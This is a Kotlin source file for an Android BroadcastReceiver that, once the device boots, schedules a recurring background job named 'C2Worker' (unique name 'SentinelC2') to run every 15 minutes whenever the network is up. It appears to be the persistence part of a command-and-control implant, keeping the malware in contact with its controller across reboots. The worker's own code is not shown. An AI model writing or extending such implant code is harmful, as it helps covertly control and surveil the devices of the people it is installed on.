package com.zero.sentinel.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.zero.sentinel.workers.C2Worker
import java.util.concurrent.TimeUnit

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
            Log.d("BootReceiver", "Boot Completed. Scheduling C2 Worker.")
            
            val workRequest = PeriodicWorkRequestBuilder<C2Worker>(15, TimeUnit.MINUTES)
                .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "SentinelC2",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
        }
    }

